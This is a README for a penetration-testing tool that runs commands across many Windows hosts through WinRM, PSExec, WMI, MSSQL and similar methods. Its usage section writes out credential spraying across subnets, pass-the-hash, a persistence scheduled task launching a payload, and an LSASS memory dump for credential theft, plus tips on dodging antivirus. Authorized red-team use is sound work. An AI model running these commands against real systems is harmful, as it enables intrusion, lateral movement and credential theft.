# exec-across-windows

A tool for executing commands across multiple Windows systems using various remote execution methods. Automatically tries multiple techniques until one succeeds, based on return codes and output. Should make executing commands using credentials a hell of a lot easier.

## Features

- **Multiple RCE Methods**: Automatically tries various Windows remote execution techniques:
  - WinRM (HTTP/HTTPS)
  - PSExec (Impacket)
  - SMBExec (NetExec)
  - WMI (NetExec)
  - AtExec (Impacket)
  - RDP (NetExec)
  - SSH (NetExec)
  - MSSQL (Impacket)

- **Intelligent Tool Selection**: 
  - Port scanning to identify viable tools before attempting execution
  - Automatic fallback between methods until one succeeds
  - Pass-the-hash support for most methods

- **Multi-threaded**: Execute commands across hundreds of hosts simultaneously
- **Flexible Credentials**: Support for password files with multiple user/password pairs
- **IP Range Parsing**: Use ranges like `192.168.1.1-254` or `10.0.1-5.10-20`

## Installation

```bash
pip install exec-across-windows
```

### External Dependencies

This tool requires the following external tools to be installed:

```bash
# Impacket (for PSExec, AtExec, MSSQL)
pipx install impacket

# NetExec (for SMBExec, WMI, RDP, SSH)
pipx install git+https://github.com/Pennyw0rth/NetExec

# Evil-WinRM (for WinRM)
gem install evil-winrm
```

## Usage

### Basic Usage

```bash
# Execute command on single host
exec-across-windows 192.168.1.10 administrator Password123 whoami

# Execute across IP range
exec-across-windows 192.168.1.1-50 admin Pass123 "net user"

# Use NT hash instead of password
exec-across-windows 10.0.0.1-10 admin :aad3b435b51404eeaad3b435b51404ee whoami
```

### Advanced Options

```bash
# Use specific tools in order
exec-across-windows --tools winrm,psexec,wmi 192.168.1.1-254 admin Pass123 whoami

# Multiple credentials from file
exec-across-windows -f creds.txt 10.0.0.1-50 whoami

# Increase threads for faster execution
exec-across-windows --threads 50 192.168.1.0-255 admin Pass123 whoami

# Show command output (may trigger AV)
exec-across-windows -o 192.168.1.10 admin Pass123 "ipconfig /all"

# Skip port scanning (faster but may try unavailable methods)
exec-across-windows --skip-portscan 192.168.1.10 admin Pass123 whoami

# Run all available tools (execute command multiple times)
exec-across-windows --run-all 192.168.1.10 admin Pass123 whoami

# Verbose output for debugging
exec-across-windows -v 192.168.1.10 admin Pass123 whoami

# Custom timeout
exec-across-windows --timeout 30 192.168.1.10 admin Pass123 "long-running-command"
```

### Credential File Format

Create a text file with alternating username/password lines:

```
administrator
Password123!
admin
Pass123
backup_admin
:aad3b435b51404eeaad3b435b51404ee
```

Lines starting with `#` are treated as comments. For NT hashes, use them directly as the password.

### IP Range Format

Supports various formats:
- Single IP: `192.168.1.10`
- Range: `192.168.1.1-254`
- Multiple ranges: `10.0.1-5.10-20` (expands to all combinations)
- File with IP ranges: `targets.txt`

## How It Works

1. **Port Scanning**: Identifies which remote execution methods are available on each target
2. **Tool Selection**: Chooses viable tools based on open ports
3. **Sequential Attempts**: Tries each tool in order until one succeeds
4. **Success Reporting**: Reports which tool worked and optionally shows command output

### Tool Priority (default order)

1. WinRM (ports 5985/5986) - Fast and reliable
2. SMBExec (port 445) - Stealthy SMB-based execution
3. WMI (port 135) - Windows Management Instrumentation
4. SSH (port 22) - If OpenSSH is installed on Windows
5. MSSQL (port 1433) - Via xp_cmdshell
6. PSExec (port 445) - Classic Sysinternals-style execution
7. AtExec (port 445) - Task Scheduler-based execution
8. RDP (port 3389) - Via clipboard injection

## Command-Line Options

```
Options:
  -v                      Verbose output (shows all tool attempts)
  -o                      Show successful command output (WARNING: may trigger AV)
  -f <file>               Use credential file instead of single username/password
  --threads <n>           Number of concurrent threads (default: 10)
  --tools <list>          Comma-separated list of tools to try in order
  --timeout <seconds>     Command timeout in seconds (default: 15)
  --run-all               Run all tools instead of stopping at first success
  --skip-portscan         Skip port scanning and attempt all tools
```

## Examples

### Penetration Testing Scenarios

```bash
# Quick domain admin check across all domain controllers
exec-across-windows 10.0.0.1-10 "DOMAIN\Administrator" Pass123 whoami

# Spray credentials across entire subnet
exec-across-windows -f creds.txt --threads 50 192.168.1.0-255 whoami

# Execute persistence mechanism
exec-across-windows 192.168.1.50 admin Pass123 'schtask /create /tn "Update" /tr "C:\payload.exe" /sc onlogon'

# Memory dump using specific tool
exec-across-windows --tools winrm 192.168.1.10 admin Pass123 'C:\procdump.exe -ma lsass.exe C:\lsass.dmp'

# Check which hosts you have admin access to
exec-across-windows --threads 100 192.168.1.0-255 admin Pass123 whoami
```

## Security Considerations

- **Use with authorization only**: This tool is designed for authorized security assessments
- **Output flag triggers AV**: Using `-o` may cause antivirus alerts due to how some tools retrieve output
- **MSSQL warning**: When MSSQL is used, `xp_cmdshell` is enabled and remains enabled
- **Credential exposure**: Credentials are passed via command line (consider using credential files)

## Troubleshooting

### Common Issues

**"No required ports open"**
- Target may be offline or firewalled
- Use `--skip-portscan` to try anyway
- Use `-v` to see which ports were checked

**"All tools failed"**
- Credentials may be incorrect
- User may not have admin rights
- AV/EDR may be blocking execution
- Try with `-o` flag disabled (default)

**"Could not retrieve" message**
- Tool authenticated but failed to run command
- Usually caused by AV detection
- Try without `-o` flag

**WinRM "NoMethodError"**
- This is normal for one-shot WinRM commands
- The command still succeeded

## License

MIT License - see LICENSE file for details

## Disclaimer

This tool is intended for authorized security assessments only. Ensure you have proper authorization before using this tool on any systems you do not own or have explicit permission to test.